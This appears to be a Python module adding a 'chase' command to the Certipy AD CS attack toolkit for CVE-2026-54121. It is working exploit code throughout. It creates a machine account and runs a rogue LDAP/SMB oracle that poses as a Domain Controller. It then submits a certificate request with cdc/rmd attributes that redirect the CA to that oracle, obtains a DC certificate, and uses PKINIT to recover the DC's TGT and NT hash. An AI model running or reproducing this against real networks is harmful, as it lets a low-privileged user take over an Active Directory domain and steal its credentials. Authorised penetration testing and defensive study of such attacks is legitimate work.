"""
CVE-2026-54121 (Certighost) 'chase' command for Certipy.

Abuses the AD CS certificate-enrollment "cdc chase" fallback so a low-privileged
domain user can obtain a certificate that impersonates a Domain Controller.

Attack outline:
    1. Discover the CA and the target Domain Controller via LDAP.
    2. Create (or reuse) a machine account through the machine-account quota.
    3. Start a rogue DC-identity oracle (LDAP + SMB/LSA) that authenticates the
       CA callback as the machine account but answers directory lookups with the
       target DC's identity (objectSid, dNSHostName, sAMAccountName).
    4. Submit a certificate request whose 'cdc' attribute points the CA back at
       the rogue oracle and whose 'rmd' attribute names the target DC. The CA
       chases the rogue oracle and issues a certificate for the DC.
    5. PKINIT with the DC certificate to recover a TGT and the DC's NT hash.
"""

import argparse
import copy
import os
import random
import string
import sys
import threading
from typing import Optional

from impacket.ntlm import compute_nthash

from certipy.commands.account import Account
from certipy.commands.auth import Authenticate
from certipy.lib.ldap import LDAPConnection, LDAPEntry
from certipy.lib.logger import logging
from certipy.lib.req import Request
from certipy.lib.rogue import RogueServer, detect_ip
from certipy.lib.target import Target

# LDAP matching rule that selects Domain Controllers via the
# SERVER_TRUST_ACCOUNT (0x2000) userAccountControl bit.
DC_UAC_FILTER = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"

# Base (relative to the configuration NC) that holds the CA enrollment objects.
ENROLLMENT_SERVICES_BASE = "CN=Enrollment Services,CN=Public Key Services,CN=Services"


def _first_raw(entry: LDAPEntry, key: str) -> Optional[bytes]:
    """
    Return the first raw (undecoded) value of an LDAP attribute.

    Args:
        entry: LDAP entry to read from
        key: Attribute name

    Returns:
        The first raw attribute value as bytes, or None if absent
    """
    raw = entry.get_raw(key)
    if raw is None:
        return None
    if isinstance(raw, (list, tuple)):
        return raw[0] if raw else None
    return raw


class Chase:
    """
    Orchestrate the CVE-2026-54121 (Certighost) cdc-chase attack against AD CS.

    This class ties the existing Certipy primitives (account creation,
    certificate request and PKINIT authentication) together with the rogue
    DC-identity oracle in certipy.lib.rogue. It discovers the CA and target
    Domain Controller, stands up the oracle, submits a certificate request whose
    cdc/rmd attributes redirect the CA's identity lookup to the oracle, and
    optionally recovers the impersonated DC's NT hash via PKINIT.
    """

    def __init__(
        self,
        target: Target,
        ca: Optional[str] = None,
        template: str = "Machine",
        target_account: Optional[str] = None,
        listener: Optional[str] = None,
        out: Optional[str] = None,
        server_only: bool = False,
        no_pkinit: bool = False,
        computer_name: Optional[str] = None,
        computer_pass: Optional[str] = None,
        computer_hash: Optional[str] = None,
        rogue_smb_port: int = 445,
        rogue_ldap_port: int = 389,
        web: bool = False,
        dcom: bool = False,
        timeout: int = 5,
        connection: Optional[LDAPConnection] = None,
        **kwargs,  # type: ignore
    ):
        """
        Initialize the chase attack.

        Args:
            target: Target environment (low-privileged user, DC as target)
            ca: Certificate Authority name (auto-discovered if None)
            template: Certificate template to request
            target_account: DC account to impersonate (auto-discovered if None)
            listener: Attacker IP for the rogue listeners / cdc value (auto-detected)
            out: Output path for the issued DC certificate (PFX)
            server_only: Only run the rogue oracle, don't run the full attack
            no_pkinit: Skip PKINIT / NT hash recovery after obtaining the certificate
            computer_name: Reuse an existing computer account instead of creating one
            computer_pass: Password for computer_name
            computer_hash: NT hash for computer_name
            rogue_smb_port: Port for the rogue SMB/LSA listener
            rogue_ldap_port: Port for the rogue LDAP listener
            web: Submit the certificate request via Web Enrollment
            dcom: Submit the certificate request via DCOM
            timeout: Connection timeout in seconds
            connection: Existing LDAP connection to reuse
            **kwargs: Additional arguments
        """
        self.target = target
        self.ca = ca
        self.template = template
        self.target_account = target_account
        self.listener = listener
        self.out = out
        self.server_only = server_only
        self.no_pkinit = no_pkinit
        self.computer_name = computer_name
        self.computer_pass = computer_pass
        self.computer_hash = computer_hash
        self.rogue_smb_port = rogue_smb_port
        self.rogue_ldap_port = rogue_ldap_port
        self.web = web
        self.dcom = dcom
        self.timeout = timeout
        self._connection = connection
        self.kwargs = kwargs

        # Populated during discovery.
        self.dc_ip: str = ""
        self.ca_dns: str = ""
        self.ca_ip: Optional[str] = None
        self.domain_dns: str = ""
        self.domain_netbios: str = ""
        self.domain_sid: str = ""
        self.domain_guid: bytes = b""
        self.target_sam: str = ""
        self.target_dns: str = ""
        self.target_sid: bytes = b""
        self.comp_name: str = ""
        self.comp_pass: Optional[str] = None
        self.comp_hash: str = ""

    @property
    def connection(self) -> LDAPConnection:
        """
        Get or establish an LDAP connection to the target DC.

        Returns:
            Active LDAP connection
        """
        if self._connection is not None:
            return self._connection
        self._connection = LDAPConnection(self.target)
        self._connection.connect()
        return self._connection

    # -- discovery ---------------------------------------------------------

    def _discover_ca(self) -> bool:
        """Discover the CA name and resolve its host. Returns True on success."""
        conn = self.connection
        search_base = f"{ENROLLMENT_SERVICES_BASE},{conn.configuration_path}"

        if self.ca is None:
            search_filter = "(objectClass=pKIEnrollmentService)"
        else:
            search_filter = f"(&(cn={self.ca})(objectClass=pKIEnrollmentService))"

        entries = conn.search(
            search_filter,
            search_base=search_base,
            attributes=["cn", "dNSHostName"],
        )
        if not entries:
            logging.error("Could not find any Enrollment Services (CA) in the domain")
            return False

        entry = entries[0]
        ca_name = entry.get("cn")
        if not isinstance(ca_name, str) or not ca_name:
            logging.error("Could not determine the CA name")
            return False
        self.ca = ca_name

        ca_dns = entry.get("dNSHostName")
        if isinstance(ca_dns, str) and ca_dns:
            self.ca_dns = ca_dns
            self.ca_ip = self.target.resolve_hostname(ca_dns)
        else:
            # Fall back to the DC as the CA host.
            self.ca_dns = self.target.dc_host or self.target.remote_name
            self.ca_ip = self.target.target_ip

        logging.info(f"Using CA {self.ca!r} on {self.ca_dns!r} ({self.ca_ip})")
        return True

    def _discover_domain(self) -> bool:
        """Read the domain DNS name, NetBIOS name, SID and GUID."""
        conn = self.connection

        domain_dns = conn.domain
        if not domain_dns:
            logging.error("Could not determine the domain DNS name")
            return False
        self.domain_dns = domain_dns
        self.domain_netbios = domain_dns.split(".")[0].upper()

        domain_sid = conn.domain_sid
        if not domain_sid:
            logging.error("Could not determine the domain SID")
            return False
        self.domain_sid = domain_sid

        entries = conn.search(
            "(objectClass=domainDNS)",
            search_base=conn.default_path,
            attributes=["objectGUID"],
        )
        if not entries:
            logging.error("Could not read the domain object")
            return False
        domain_guid = _first_raw(entries[0], "objectGUID")
        if not domain_guid:
            logging.error("Could not determine the domain GUID")
            return False
        self.domain_guid = domain_guid
        return True

    def _discover_target_dc(self) -> bool:
        """Resolve the target Domain Controller's identity."""
        conn = self.connection

        if self.target_account:
            sam = self.target_account
            if not sam.endswith("$"):
                sam += "$"
            search_filter = f"(&(objectCategory=computer)(sAMAccountName={sam}))"
        else:
            search_filter = f"(&(objectCategory=computer){DC_UAC_FILTER})"

        entries = conn.search(
            search_filter,
            attributes=["sAMAccountName", "dNSHostName", "objectSid"],
        )
        if not entries:
            logging.error("Could not find the target Domain Controller")
            return False

        entry = entries[0]
        target_sam = entry.get("sAMAccountName")
        if not isinstance(target_sam, str) or not target_sam:
            logging.error("Target Domain Controller is missing a sAMAccountName")
            return False
        self.target_sam = target_sam

        target_dns = entry.get("dNSHostName")
        if isinstance(target_dns, str) and target_dns:
            self.target_dns = target_dns
        else:
            self.target_dns = f"{target_sam.rstrip('$').lower()}.{self.domain_dns}"

        target_sid = _first_raw(entry, "objectSid")
        if not target_sid:
            logging.error("Target Domain Controller is missing an objectSid")
            return False
        self.target_sid = target_sid

        logging.info(f"Impersonation target: {self.target_sam!r} ({self.target_dns})")
        return True

    # -- machine account ---------------------------------------------------

    def _prepare_machine_account(self) -> bool:
        """Create a new machine account, or use the one supplied on the CLI."""
        if self.computer_name:
            sam = self.computer_name
            if not sam.endswith("$"):
                sam += "$"
            self.comp_name = sam
            if self.computer_hash:
                self.comp_hash = self.computer_hash
                self.comp_pass = None
            elif self.computer_pass:
                self.comp_pass = self.computer_pass
                self.comp_hash = compute_nthash(self.computer_pass).hex()
            else:
                logging.error(
                    "Provide -computer-pass or -computer-hash with -computer-name"
                )
                return False
            logging.info(f"Using existing machine account {self.comp_name!r}")
            return True

        base = "CHASE" + "".join(
            random.choice(string.ascii_uppercase) for _ in range(8)
        )
        account = Account(
            self.target,
            user=base,
            connection=self.connection,
            timeout=self.timeout,
        )
        logging.info(f"Creating machine account {(base + '$')!r}")
        if not account.create():
            return False

        self.comp_name = base + "$"
        if not account.password:
            logging.error("Machine account was created but no password was returned")
            return False
        self.comp_pass = account.password
        self.comp_hash = compute_nthash(account.password).hex()
        return True

    # -- rogue oracle ------------------------------------------------------

    def _start_rogue(self) -> Optional[RogueServer]:
        """Start the rogue DC-identity oracle and wait for it to be ready."""
        listener = self.listener or detect_ip(self.dc_ip)
        if not listener:
            logging.error("Could not auto-detect the listener IP; use -listener")
            return None
        self.listener = listener

        logging.info(
            f"Starting rogue DC-identity oracle on {listener} "
            f"(SMB {self.rogue_smb_port} + LDAP {self.rogue_ldap_port})"
        )
        rogue = RogueServer(
            listen_address="0.0.0.0",
            domain_dns=self.domain_dns,
            domain_netbios=self.domain_netbios,
            domain_sid=self.domain_sid,
            domain_guid=self.domain_guid,
            machine_name=self.comp_name,
            machine_nthash=self.comp_hash,
            machine_password=self.comp_pass,
            dc_ip=self.dc_ip,
            target_sam=self.target_sam,
            target_dns=self.target_dns,
            target_sid=self.target_sid,
            smb_port=self.rogue_smb_port,
            ldap_port=self.rogue_ldap_port,
        )
        rogue.start()
        if not rogue.wait_until_ready():
            logging.error(
                "Rogue listeners failed to start "
                "(ports 389/445 require root and must be free)"
            )
            rogue.shutdown()
            return None
        return rogue

    # -- certificate request + PKINIT --------------------------------------

    def _request_and_pkinit(self) -> bool:
        """Submit the crafted request and, unless disabled, PKINIT to a hash."""
        # The certificate request must authenticate as the machine account, and
        # be directed at the CA host rather than the DC.
        ca_target = copy.copy(self.target)
        ca_target.username = self.comp_name
        ca_target.password = None
        ca_target.hashes = None
        ca_target.lmhash = ""
        ca_target.nthash = self.comp_hash
        ca_target.aes = None
        ca_target.do_kerberos = False
        ca_target.remote_name = self.ca_dns
        ca_target.target_ip = self.ca_ip

        pfx_path = self.out or f"{self.target_sam.rstrip('$').lower()}.pfx"

        request = Request(
            target=ca_target,
            ca=self.ca,
            template=self.template,
            dns=self.target_dns,
            cdc=self.listener,
            rmd=self.target_dns,
            web=self.web,
            dcom=self.dcom,
            out=pfx_path,
        )
        logging.info(
            f"Requesting certificate as {self.comp_name!r} "
            f"(cdc={self.listener}, rmd={self.target_dns})"
        )
        if not request.request():
            logging.error("Certificate request failed")
            return False

        if self.no_pkinit:
            logging.info(f"Saved the DC certificate to {pfx_path!r} (skipping PKINIT)")
            return True

        logging.info(f"Authenticating as {self.target_sam!r} via PKINIT")
        authenticate = Authenticate(self.target, pfx=pfx_path)
        _ = authenticate.authenticate(username=self.target_sam, domain=self.domain_dns)
        if authenticate.nt_hash:
            logging.info(f"Got NT hash for {self.target_sam!r}: {authenticate.nt_hash}")
        else:
            logging.warning("PKINIT completed but no NT hash was recovered")
        return True

    def _print_server_only_hint(self) -> None:
        """Print the 'certipy req' command that drives the running oracle."""
        logging.info(
            "Rogue oracle ready. Submit the request from another shell as the "
            "machine account:\n"
            f"    certipy req -u {self.comp_name} -hashes {self.comp_hash} "
            f"-dc-ip {self.dc_ip} -ca {self.ca} -template {self.template} "
            f"-dns {self.target_dns} -cdc {self.listener} -rmd {self.target_dns}"
        )

    # -- orchestration -----------------------------------------------------

    def run(self) -> bool:
        """Run the full chase attack (or just the oracle in server-only mode)."""
        if hasattr(os, "geteuid") and os.geteuid() != 0:  # type: ignore[attr-defined]
            logging.warning(
                "Not running as root; binding the rogue LDAP/SMB ports "
                "(389/445) will most likely fail"
            )

        dc_ip = self.target.dc_ip or self.target.target_ip
        if not dc_ip:
            logging.error("Could not determine the DC IP (use -dc-ip)")
            return False
        self.dc_ip = dc_ip

        if not self._discover_ca():
            return False
        if not self._discover_domain():
            return False
        if not self._discover_target_dc():
            return False
        if not self._prepare_machine_account():
            return False

        rogue = self._start_rogue()
        if rogue is None:
            return False

        try:
            if self.server_only:
                self._print_server_only_hint()
                logging.info("Press Ctrl+C to stop the rogue oracle")
                threading.Event().wait()
                return True
            return self._request_and_pkinit()
        except KeyboardInterrupt:
            logging.info("Stopping the rogue oracle")
            return True
        finally:
            rogue.shutdown()


def entry(options: argparse.Namespace) -> None:
    """
    Command-line entry point for the chase attack.

    Args:
        options: Parsed command-line arguments
    """
    target = Target.from_options(options, dc_as_target=True)
    options.__delattr__("target")

    chase = Chase(target, **vars(options))
    if chase.run() is False:
        sys.exit(1)
